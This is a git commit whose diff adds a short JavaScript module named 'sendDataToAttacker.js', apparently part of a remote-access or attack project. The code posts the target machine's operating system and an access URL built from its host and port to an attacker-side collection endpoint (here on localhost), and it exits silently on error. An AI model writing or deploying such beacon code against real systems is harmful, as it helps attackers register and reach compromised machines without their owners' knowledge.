3e1c686cc33feb40d99961a433c9813094ecb94f
nimabht <nimabeheshtaein99@gmail.com>
2023-06-07 16:24:01 +0330

    [feat] init data sender created

---
+++ target 1/utils/sendDataToAttacker.js
@@ -0,0 +1,11 @@
+import axios from "axios";
+export default async (os, host, port) => {
+  try {
+    await axios.post("http://127.0.0.1:3000/target", {
+      access_url: `http://${host}:${port}`,
+      os,
+    });
+  } catch (error) {
+    process.exit(1);
+  }
+};
